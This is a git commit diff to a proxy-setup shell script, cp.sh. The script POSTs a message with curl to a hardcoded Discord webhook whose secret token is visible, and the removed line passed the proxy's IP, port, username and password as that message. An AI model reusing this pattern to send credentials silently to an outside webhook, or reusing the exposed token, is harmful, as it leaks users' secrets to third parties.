cc7ea21cf16e3f7165b8e9606d93385afcf72206
LemonProxiesDev <70445676+LemonProxiesDev@users.noreply.github.com>
2020-09-01 14:46:35 +0200

    Update cp.sh

--- cp.sh
+++ cp.sh
@@ -29,7 +29,6 @@ msg_content=\"$message\"
 ## discord webhook
 url='https://discordapp.com/api/webhooks/750307253541797960/8GkGqqlZhfUfJH-PthUq7LraaCYoMYknP9iFMYBRiM0iyATYonATNsDqfGVN7qJ1HvKf'
 curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_content}" $url
-./cp.sh "Your Proxy is : ${ip}:${port}:${user}:${passw}"
 # -X POST - use POST method.
 # -H "Content-Type: application/json" - header tells server you're sending JSON data.
 # -d '{"username": "test", "content": "hello"}' - sets request data.
